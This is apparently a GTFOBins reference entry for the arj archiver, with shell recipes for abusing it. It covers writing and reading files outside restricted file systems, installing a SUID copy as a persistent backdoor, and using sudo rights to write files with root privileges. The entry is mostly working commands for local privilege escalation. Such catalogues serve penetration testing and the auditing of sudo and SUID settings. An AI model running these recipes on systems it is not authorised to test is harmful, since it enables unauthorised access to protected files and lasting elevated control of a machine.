# GTFOBin: arj

## File write

It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.

The archive can also be prepared offline then uploaded.

```
TF=$(mktemp -d)
LFILE=file_to_write
LDIR=where_to_write
echo DATA >"$TF/$LFILE"
arj a "$TF/a" "$TF/$LFILE"
arj e "$TF/a" $LDIR
```

## File read

It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.

The file appears amid some other textual information. The archive can also be downloaded then extracted offline.

```
TF=$(mktemp -u)
LFILE=file_to_read
arj a "$TF" "$LFILE"
arj p "$TF"
```

## SUID

If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.

This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.

The archive can also be prepared offline then uploaded.

```
sudo install -m =xs $(which arj) .

TF=$(mktemp -d)
LFILE=file_to_write
LDIR=where_to_write
echo DATA >"$TF/$LFILE"
arj a "$TF/a" "$TF/$LFILE"
./arj e "$TF/a" $LDIR
```

## Sudo

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

The archive can also be prepared offline then uploaded.

```
TF=$(mktemp -d)
LFILE=file_to_write
LDIR=where_to_write
echo DATA >"$TF/$LFILE"
arj a "$TF/a" "$TF/$LFILE"
sudo arj e "$TF/a" $LDIR
```